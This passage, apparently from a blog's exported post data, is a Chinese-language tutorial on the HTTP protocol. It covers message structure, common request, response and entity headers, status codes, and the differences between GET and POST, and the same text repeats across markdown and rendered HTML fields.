表示消息发送的时间，服务器响应中要包含这个头部\n    * Cache-Control: 指定请求和响应遵循的缓存机制\n    * Via: 表示从请求到响应经过了哪些代理服务器\n* 请求首部\n    * 信息性首部\n        * Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号\n        * Referer：浏览器向WEB 服务器表明自己是从哪个网页URL获得点击当前请求中的网址\n        * Range: 指定第一个字节的位置和最后一个字节的位置\n        * User-Agent：发送操作系统与浏览器的名称与版本号\n    * Accept 首部\n        * Accept：告诉WEB服务器自己接受什么介质类型，/ 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type\n        * Accept-Chartset：浏览器告诉服务器自己能接收的字符集\n        * Accept-Encoding：浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）\n        * Accept-Language：浏览器申明自己接收的语言。语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等\n    * 条件请求首部\n        * If-Match：如果对象的 ETag 没有改变（对象没有改变），才执行请求的动作，获取文档。\n        * If-None-Macth：如果对象的 ETag 改变了（对象也改变了），才执行请求的动作，获取文档。\n        * If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器该对象没有修改。\n        * If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。\n    * 安全请求首部\n        * Authorization：当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB服务器\n        * Cookie：由客户端发送，包含在HTTP请求的头部中。注意，只有cookie的domain和path与请求的URL匹配才会发送这个cookie。\n    * 代理请求首部\n        * Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。\n* 响应首部\n    * 信息性首部\n        * Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了\n        * Server：WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)\n        * Vary：WEB服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为：Content-Encoding: gzip; Vary: Content-Encoding，那么Cache服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache服务器用自己Cache里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding。\n    * 安全响应首部\n        * Set-Cookie：由服务器发送，它包含在响应请求的头部中。它用于在客户端创建一个Cookie。\n        * Proxy-Authenticate：代理服务器响应浏览器，要求其提供代理身份验证信息。\n        * Access-Control-Allow-Origin：origin 参数的值指定了允许访问该资源的外域 URI（Ajax 跨域资源共享）\n* 实体首部\n    * 信息性首部\n        * Allow：服务器支持哪些请求方法（如GET、POST等）。\n        * Location：表示客户应当到哪里去提取文档，用于将接收端定位到资源的位置（URL）上。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302\n    * 实体内容首部\n        * Content-Encoding:告知客户端服务器对实体的主体部分选用的内容编码方式。（gzip/compress/deflate/identity)\n        * Content-Language:告知客户端，实体主体使用的自然语言。（中文或英文等语言）\n        * Content-Length：表明了实体主体部分的大小。\n        * Content-Location:给出与报文主体返回资源对应的URI。\n        * Content-MD5：是一串由MD5算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。\n        * Content-Range:针对范围请求，返回响应时使用的首部字段，能告知客户端作为相应返回的实体的哪个部分符合范围请求。\n        * Content-Type:说明了实体主体内对象的媒体类型，该字段用type/subtype形式赋值。\n    * 实体缓存首部\n        * Etag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html文件，如果被修改了，其Etag也会别修改，所以，ETag的作用跟Last-Modified的作用差不多，主要供WEB服务器判断一个对象是否改变了。比如前一次请求某个html文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得ETag值发送给WEB服务器，然后WEB服务器会把这个ETag跟该文件的当前ETag进行对比，然后就知道这个文件有没有改变了。\n        * Expires：WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT\n        * Last-Modified：WEB服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT\n    * 实体编码首部\n        * Accept-Encoding：客户端发送给服务器，表明自己可以接受哪些编码（gzip、compress、deflate、identity）\n        * Content-Encoding: 服务器发送给客户端，告诉客户端以哪种方式解码 （gzip、compress、deflate、identity）\n\n### 4、HTTP 状态码\n* 100 Continue\n* 200 OK\n* 201 Created 请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其 URI 已经随Location 头信息返回 (常规使用场景是作为 PUT 请求的返回值)\n* 202 Accepted 服务器已接受请求，但尚未处理\n* 204 No Content（无内容）\n* 206 Partial Content（使用断点续传）\n* 301 Moved Permanently\n* 302 Move Temporarily\n* 304 Not Modified\n* 400 Bad Request（不合规范的请求）\n* 401 Unauthorized（未授权）\n* 403 Forbidden（禁止访问）\n* 404 Not Found（文件找不到）\n* 500 Internal Server Error（内部服务器错误）\n* 503 Service Unavailable（服务不可用）\n* 504 Gateway Timeout\n\n### 5、Get 与 Post 请求的区别\n* Get 请求能缓存，Post 不能\n* Post 相对 Get 安全一点点，因为Get 请求都包含在 URL 里，且会被浏览器保存历史纪录，Post 不会，但是在抓包的情况下都是一样的。\n* Post 可以通过 request body来传输比 Get 更多的数据，Get 没有这个技术\n* URL有长度限制，会影响 Get 请求，但是这个长度限制是浏览器规定的，不是 RFC 规定的\n* Post 支持更多的编码类型且不对数据类型限制","source":"_posts/HTTP/HTTP 协议.md","raw":"---\ntitle: HTTP 协议\ncategories: HTTP\ntags: [HTTP]\ndate: 2021-01-14 15:39:00\n---\n\n# HTTP 协议\n\n### 1、定义\nHTTP协议即超文本传送协议 (Hypertext Transfer Protocol )，是建立在TCP协议之上的一种应用。HTTP连接最显著的特点是客户端发送的每次请求都需要服务器回送响应，在请求结束后，会主动释放连接。从建立连接到关闭连接的过程称为 \"一次连接\"。\n\n1. 在HTTP 1.0 中客户端的每次请求都要求建立一次单独的连接，在处理完本次请求后，就自动释放连接。\n2. 在HTTP 1.1 中可以在一次连接中处理多个请求，并且多个请求可以重叠进行，不需要等待一个请求结束后再发送下一个请求。\n\n\n由于 HTTP 在每次请求结束后都会主动释放连接，因此 HTTP 连接是一种\"短连接\"要保持客户端程序的在线状态，需要不断地向服务器发起连接请求。通常的做法是即时不需要获得任何数据，客户端也保持每隔一段固定的时间向服务器发送一次“保持连接”的请求，服务器在收到该请求后对客户端进行回复，表明知道客户端“在线”。若服务器长时间无法收到客户端的请求，则认为客户端“下线”，若客户端长时间无法收到服务器的回复，则认为网络已经断开。\n\n**http报文是在http应用程序之间传递的数据块，这些数据描述了报文的内容和含义，以及数据部分**\n\n### 2、组成\n\n报文的组成：起始行、首部、主体\n\n```\n// http 请求报文\nGET /home/index.html http/1.0 //起始行\n\nHost: www.abc.com //首部\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 //首部\n\n\n// http 响应报文\nHTTP/1.0 200 OK //起始行\n\nContent-type:text/plain //首部\nContent-length:19 //首部\n\nHi I'm a message! 主体\n```\n\n\n### 3、首部头信息\n\n* 通用首部: 提供报文相关的最基本的信息，可在请求报文、响应报文中使用\n    * Connection: 表示是否需要持久连接\n    * Date: 表示消息发送的时间，服务器响应中要包含这个头部\n    * Cache-Control: 指定请求和响应遵循的缓存机制\n    * Via: 表示从请求到响应经过了哪些代理服务器\n* 请求首部\n    * 信息性首部\n        * Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号\n        * Referer：浏览器向WEB 服务器表明自己是从哪个网页URL获得点击当前请求中的网址\n        * Range: 指定第一个字节的位置和最后一个字节的位置\n        * User-Agent：发送操作系统与浏览器的名称与版本号\n    * Accept 首部\n        * Accept：告诉WEB服务器自己接受什么介质类型，/ 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type\n        * Accept-Chartset：浏览器告诉服务器自己能接收的字符集\n        * Accept-Encoding：浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）\n        * Accept-Language：浏览器申明自己接收的语言。语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等\n    * 条件请求首部\n        * If-Match：如果对象的 ETag 没有改变（对象没有改变），才执行请求的动作，获取文档。\n        * If-None-Macth：如果对象的 ETag 改变了（对象也改变了），才执行请求的动作，获取文档。\n        * If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器该对象没有修改。\n        * If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。\n    * 安全请求首部\n        * Authorization：当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB服务器\n        * Cookie：由客户端发送，包含在HTTP请求的头部中。注意，只有cookie的domain和path与请求的URL匹配才会发送这个cookie。\n    * 代理请求首部\n        * Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。\n* 响应首部\n    * 信息性首部\n        * Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了\n        * Server：WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)\n        * Vary：WEB服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为：Content-Encoding: gzip; Vary: Content-Encoding，那么Cache服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache服务器用自己Cache里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding。\n    * 安全响应首部\n        * Set-Cookie：由服务器发送，它包含在响应请求的头部中。它用于在客户端创建一个Cookie。\n        * Proxy-Authenticate：代理服务器响应浏览器，要求其提供代理身份验证信息。\n        * Access-Control-Allow-Origin：origin 参数的值指定了允许访问该资源的外域 URI（Ajax 跨域资源共享）\n* 实体首部\n    * 信息性首部\n        * Allow：服务器支持哪些请求方法（如GET、POST等）。\n        * Location：表示客户应当到哪里去提取文档，用于将接收端定位到资源的位置（URL）上。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302\n    * 实体内容首部\n        * Content-Encoding:告知客户端服务器对实体的主体部分选用的内容编码方式。（gzip/compress/deflate/identity)\n        * Content-Language:告知客户端，实体主体使用的自然语言。（中文或英文等语言）\n        * Content-Length：表明了实体主体部分的大小。\n        * Content-Location:给出与报文主体返回资源对应的URI。\n        * Content-MD5：是一串由MD5算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。\n        * Content-Range:针对范围请求，返回响应时使用的首部字段，能告知客户端作为相应返回的实体的哪个部分符合范围请求。\n        * Content-Type:说明了实体主体内对象的媒体类型，该字段用type/subtype形式赋值。\n    * 实体缓存首部\n        * Etag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html文件，如果被修改了，其Etag也会别修改，所以，ETag的作用跟Last-Modified的作用差不多，主要供WEB服务器判断一个对象是否改变了。比如前一次请求某个html文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得ETag值发送给WEB服务器，然后WEB服务器会把这个ETag跟该文件的当前ETag进行对比，然后就知道这个文件有没有改变了。\n        * Expires：WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT\n        * Last-Modified：WEB服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT\n    * 实体编码首部\n        * Accept-Encoding：客户端发送给服务器，表明自己可以接受哪些编码（gzip、compress、deflate、identity）\n        * Content-Encoding: 服务器发送给客户端，告诉客户端以哪种方式解码 （gzip、compress、deflate、identity）\n\n### 4、HTTP 状态码\n* 100 Continue\n* 200 OK\n* 201 Created 请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其 URI 已经随Location 头信息返回 (常规使用场景是作为 PUT 请求的返回值)\n* 202 Accepted 服务器已接受请求，但尚未处理\n* 204 No Content（无内容）\n* 206 Partial Content（使用断点续传）\n* 301 Moved Permanently\n* 302 Move Temporarily\n* 304 Not Modified\n* 400 Bad Request（不合规范的请求）\n* 401 Unauthorized（未授权）\n* 403 Forbidden（禁止访问）\n* 404 Not Found（文件找不到）\n* 500 Internal Server Error（内部服务器错误）\n* 503 Service Unavailable（服务不可用）\n* 504 Gateway Timeout\n\n### 5、Get 与 Post 请求的区别\n* Get 请求能缓存，Post 不能\n* Post 相对 Get 安全一点点，因为Get 请求都包含在 URL 里，且会被浏览器保存历史纪录，Post 不会，但是在抓包的情况下都是一样的。\n* Post 可以通过 request body来传输比 Get 更多的数据，Get 没有这个技术\n* URL有长度限制，会影响 Get 请求，但是这个长度限制是浏览器规定的，不是 RFC 规定的\n* Post 支持更多的编码类型且不对数据类型限制","slug":"HTTP/HTTP 协议","published":1,"updated":"2021-04-30T07:19:41.798Z","_id":"cko3zbiwq000gmi6r3n3oag8j","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"HTTP-协议\"><a href=\"#HTTP-协议\" class=\"headerlink\" title=\"HTTP 协议\"></a>HTTP 协议</h1><h3 id=\"1、定义\"><a href=\"#1、定义\" class=\"headerlink\" title=\"1、定义\"></a>1、定义</h3><p>HTTP协议即超文本传送协议 (Hypertext Transfer Protocol )，是建立在TCP协议之上的一种应用。HTTP连接最显著的特点是客户端发送的每次请求都需要服务器回送响应，在请求结束后，会主动释放连接。从建立连接到关闭连接的过程称为 “一次连接”。</p>\n<ol>\n<li>在HTTP 1.0 中客户端的每次请求都要求建立一次单独的连接，在处理完本次请求后，就自动释放连接。</li>\n<li>在HTTP 1.1 中可以在一次连接中处理多个请求，并且多个请求可以重叠进行，不需要等待一个请求结束后再发送下一个请求。</li>\n</ol>\n<p>由于 HTTP 在每次请求结束后都会主动释放连接，因此 HTTP 连接是一种”短连接”要保持客户端程序的在线状态，需要不断地向服务器发起连接请求。通常的做法是即时不需要获得任何数据，客户端也保持每隔一段固定的时间向服务器发送一次“保持连接”的请求，服务器在收到该请求后对客户端进行回复，表明知道客户端“在线”。若服务器长时间无法收到客户端的请求，则认为客户端“下线”，若客户端长时间无法收到服务器的回复，则认为网络已经断开。</p>\n<p><strong>http报文是在http应用程序之间传递的数据块，这些数据描述了报文的内容和含义，以及数据部分</strong></p>\n<h3 id=\"2、组成\"><a href=\"#2、组成\" class=\"headerlink\" title=\"2、组成\"></a>2、组成</h3><p>报文的组成：起始行、首部、主体</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; http 请求报文</span><br><span class=\"line\">GET &#x2F;home&#x2F;index.html http&#x2F;1.0 &#x2F;&#x2F;起始行</span><br><span class=\"line\"></span><br><span class=\"line\">Host: www.abc.com &#x2F;&#x2F;首部</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8 &#x2F;&#x2F;首部</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; http 响应报文</span><br><span class=\"line\">HTTP&#x2F;1.0 200 OK &#x2F;&#x2F;起始行</span><br><span class=\"line\"></span><br><span class=\"line\">Content-type:text&#x2F;plain &#x2F;&#x2F;首部</span><br><span class=\"line\">Content-length:19 &#x2F;&#x2F;首部</span><br><span class=\"line\"></span><br><span class=\"line\">Hi I&#39;m a message! 主体</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"3、首部头信息\"><a href=\"#3、首部头信息\" class=\"headerlink\" title=\"3、首部头信息\"></a>3、首部头信息</h3><ul>\n<li>通用首部: 提供报文相关的最基本的信息，可在请求报文、响应报文中使用<ul>\n<li>Connection: 表示是否需要持久连接</li>\n<li>Date: 表示消息发送的时间，服务器响应中要包含这个头部</li>\n<li>Cache-Control: 指定请求和响应遵循的缓存机制</li>\n<li>Via: 表示从请求到响应经过了哪些代理服务器</li>\n</ul>\n</li>\n<li>请求首部<ul>\n<li>信息性首部<ul>\n<li>Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号</li>\n<li>Referer：浏览器向WEB 服务器表明自己是从哪个网页URL获得点击当前请求中的网址</li>\n<li>Range: 指定第一个字节的位置和最后一个字节的位置</li>\n<li>User-Agent：发送操作系统与浏览器的名称与版本号</li>\n</ul>\n</li>\n<li>Accept 首部<ul>\n<li>Accept：告诉WEB服务器自己接受什么介质类型，/ 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type</li>\n<li>Accept-Chartset：浏览器告诉服务器自己能接收的字符集</li>\n<li>Accept-Encoding：浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）</li>\n<li>Accept-Language：浏览器申明自己接收的语言。语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等</li>\n</ul>\n</li>\n<li>条件请求首部<ul>\n<li>If-Match：如果对象的 ETag 没有改变（对象没有改变），才执行请求的动作，获取文档。</li>\n<li>If-None-Macth：如果对象的 ETag 改变了（对象也改变了），才执行请求的动作，获取文档。</li>\n<li>If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器该对象没有修改。</li>\n<li>If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。</li>\n</ul>\n</li>\n<li>安全请求首部<ul>\n<li>Authorization：当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB服务器</li>\n<li>Cookie：由客户端发送，包含在HTTP请求的头部中。注意，只有cookie的domain和path与请求的URL匹配才会发送这个cookie。</li>\n</ul>\n</li>\n<li>代理请求首部<ul>\n<li>Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>响应首部<ul>\n<li>信息性首部<ul>\n<li>Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了</li>\n<li>Server：WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)</li>\n<li>Vary：WEB服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为：Content-Encoding: gzip; Vary: Content-Encoding，那么Cache服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache服务器用自己Cache里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding。</li>\n</ul>\n</li>\n<li>安全响应首部<ul>\n<li>Set-Cookie：由服务器发送，它包含在响应请求的头部中。它用于在客户端创建一个Cookie。</li>\n<li>Proxy-Authenticate：代理服务器响应浏览器，要求其提供代理身份验证信息。</li>\n<li>Access-Control-Allow-Origin：origin 参数的值指定了允许访问该资源的外域 URI（Ajax 跨域资源共享）</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>实体首部<ul>\n<li>信息性首部<ul>\n<li>Allow：服务器支持哪些请求方法（如GET、POST等）。</li>\n<li>Location：表示客户应当到哪里去提取文档，用于将接收端定位到资源的位置（URL）上。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302</li>\n</ul>\n</li>\n<li>实体内容首部<ul>\n<li>Content-Encoding:告知客户端服务器对实体的主体部分选用的内容编码方式。（gzip/compress/deflate/identity)</li>\n<li>Content-Language:告知客户端，实体主体使用的自然语言。（中文或英文等语言）</li>\n<li>Content-Length：表明了实体主体部分的大小。</li>\n<li>Content-Location:给出与报文主体返回资源对应的URI。</li>\n<li>Content-MD5：是一串由MD5算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。</li>\n<li>Content-Range:针对范围请求，返回响应时使用的首部字段，能告知客户端作为相应返回的实体的哪个部分符合范围请求。</li>\n<li>Content-Type:说明了实体主体内对象的媒体类型，该字段用type/subtype形式赋值。</li>\n</ul>\n</li>\n<li>实体缓存首部<ul>\n<li>Etag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html文件，如果被修改了，其Etag也会别修改，所以，ETag的作用跟Last-Modified的作用差不多，主要供WEB服务器判断一个对象是否改变了。比如前一次请求某个html文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得ETag值发送给WEB服务器，然后WEB服务器会把这个ETag跟该文件的当前ETag进行对比，然后就知道这个文件有没有改变了。</li>\n<li>Expires：WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT</li>\n<li>Last-Modified：WEB服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT</li>\n</ul>\n</li>\n<li>实体编码首部<ul>\n<li>Accept-Encoding：客户端发送给服务器，表明自己可以接受哪些编码（gzip、compress、deflate、identity）</li>\n<li>Content-Encoding: 服务器发送给客户端，告诉客户端以哪种方式解码 （gzip、compress、deflate、identity）</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"4、HTTP-状态码\"><a href=\"#4、HTTP-状态码\" class=\"headerlink\" title=\"4、HTTP 状态码\"></a>4、HTTP 状态码</h3><ul>\n<li>100 Continue</li>\n<li>200 OK</li>\n<li>201 Created 请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其 URI 已经随Location 头信息返回 (常规使用场景是作为 PUT 请求的返回值)</li>\n<li>202 Accepted 服务器已接受请求，但尚未处理</li>\n<li>204 No Content（无内容）</li>\n<li>206 Partial Content（使用断点续传）</li>\n<li>301 Moved Permanently</li>\n<li>302 Move Temporarily</li>\n<li>304 Not Modified</li>\n<li>400 Bad Request（不合规范的请求）</li>\n<li>401 Unauthorized（未授权）</li>\n<li>403 Forbidden（禁止访问）</li>\n<li>404 Not Found（文件找不到）</li>\n<li>500 Internal Server Error（内部服务器错误）</li>\n<li>503 Service Unavailable（服务不可用）</li>\n<li>504 Gateway Timeout</li>\n</ul>\n<h3 id=\"5、Get-与-Post-请求的区别\"><a href=\"#5、Get-与-Post-请求的区别\" class=\"headerlink\" title=\"5、Get 与 Post 请求的区别\"></a>5、Get 与 Post 请求的区别</h3><ul>\n<li>Get 请求能缓存，Post 不能</li>\n<li>Post 相对 Get 安全一点点，因为Get 请求都包含在 URL 里，且会被浏览器保存历史纪录，Post 不会，但是在抓包的情况下都是一样的。</li>\n<li>Post 可以通过 request body来传输比 Get 更多的数据，Get 没有这个技术</li>\n<li>URL有长度限制，会影响 Get 请求，但是这个长度限制是浏览器规定的，不是 RFC 规定的</li>\n<li>Post 支持更多的编码类型且不对数据类型限制</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"HTTP-协议\"><a href=\"#HTTP-协议\" class=\"headerlink\" title=\"HTTP 协议\"></a>HTTP 协议</h1><h3 id=\"1、定义\"><a href=\"#1、定义\" class=\"headerlink\" title=\"1、定义\"></a>1、定义</h3><p>HTTP协议即超文本传送协议 (Hypertext Transfer Protocol )，是建立在TCP协议之上的一种应用。HTTP连接最显著的特点是客户端发送的每次请求都需要服务器回送响应，在请求结束后，会主动释放连接。从建立连接到关闭连接的过程称为 “一次连接”。</p>\n<ol>\n<li>在HTTP 1.0 中客户端的每次请求都要求建立一次单独的连接，在处理完本次请求后，就自动释放连接。</li>\n<li>在HTTP 1.1 中可以在一次连接中处理多个请求，并且多个请求可以重叠进行，不需要等待一个请求结束后再发送下一个请求。</li>\n</ol>\n<p>由于 HTTP 在每次请求结束后都会主动释放连接，因此 HTTP 连接是一种”短连接”要保持客户端程序的在线状态，需要不断地向服务器发起连接请求。通常的做法是即时不需要获得任何数据，客户端也保持每隔一段固定的时间向服务器发送一次“保持连接”的请求，服务器在收到该请求后对客户端进行回复，表明知道客户端“在线”。若服务器长时间无法收到客户端的请求，则认为客户端“下线”，若客户端长时间无法收到服务器的回复，则认为网络已经断开。</p>\n<p><strong>http报文是在http应用程序之间传递的数据块，这些数据描述了报文的内容和含义，以及数据部分</strong></p>\n<h3 id=\"2、组成\"><a href=\"#2、组成\" class=\"headerlink\" title=\"2、组成\"></a>2、组成</h3><p>报文的组成：起始行、首部、主体</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; http 请求报文</span><br><span class=\"line\">GET &#x2F;home&#x2F;index.html http&#x2F;1.0 &#x2F;&#x2F;起始行</span><br><span class=\"line\"></span><br><span class=\"line\">Host: www.abc.com &#x2F;&#x2F;首部</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8 &#x2F;&#x2F;首部</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; http 响应报文</span><br><span class=\"line\">HTTP&#x2F;1.0 200 OK &#x2F;&#x2F;起始行</span><br><span class=\"line\"></span><br><span class=\"line\">Content-type:text&#x2F;plain &#x2F;&#x2F;首部</span><br><span class=\"line\">Content-length:19 &#x2F;&#x2F;首部</span><br><span class=\"line\"></span><br><span class=\"line\">Hi I&#39;m a message! 主体</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"3、首部头信息\"><a href=\"#3、首部头信息\" class=\"headerlink\" title=\"3、首部头信息\"></a>3、首部头信息</h3><ul>\n<li>通用首部: 提供报文相关的最基本的信息，可在请求报文、响应报文中使用<ul>\n<li>Connection: 表示是否需要持久连接</li>\n<li>Date: 表示消息发送的时间，服务器响应中要包含这个头部</li>\n<li>Cache-Control: 指定请求和响应遵循的缓存机制</li>\n<li>Via: 表示从请求到响应经过了哪些代理服务器</li>\n</ul>\n</li>\n<li>请求首部<ul>\n<li>信息性首部<ul>\n<li>Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号</li>\n<li>Referer：浏览器向WEB 服务器表明自己是从哪个网页URL获得点击当前请求中的网址</li>\n<li>Range: 指定第一个字节的位置和最后一个字节的位置</li>\n<li>User-Agent：发送操作系统与浏览器的名称与版本号</li>\n</ul>\n</li>\n<li>Accept 首部<ul>\n<li>Accept：告诉WEB服务器自己接受什么介质类型，/ 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type</li>\n<li>Accept-Chartset：浏览器告诉服务器自己能接收的字符集</li>\n<li>Accept-Encoding：浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）</li>\n<li>Accept-Language：浏览器申明自己接收的语言。语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等</li>\n</ul>\n</li>\n<li>条件请求首部<ul>\n<li>If-Match：如果对象的 ETag 没有改变（对象没有改变），才执行请求的动作，获取文档。</li>\n<li>If-None-Macth：如果对象的 ETag 改变了（对象也改变了），才执行请求的动作，获取文档。</li>\n<li>If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器该对象没有修改。</li>\n<li>If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。</li>\n</ul>\n</li>\n<li>安全请求首部<ul>\n<li>Authorization：当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB服务器</li>\n<li>Cookie：由客户端发送，包含在HTTP请求的头部中。注意，只有cookie的domain和path与请求的URL匹配才会发送这个cookie。</li>\n</ul>\n</li>\n<li>代理请求首部<ul>\n<li>Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>响应首部<ul>\n<li>信息性首部<ul>\n<li>Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了</li>\n<li>Server：WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)</li>\n<li>Vary：WEB服务器用该头部的内容告诉 Cache 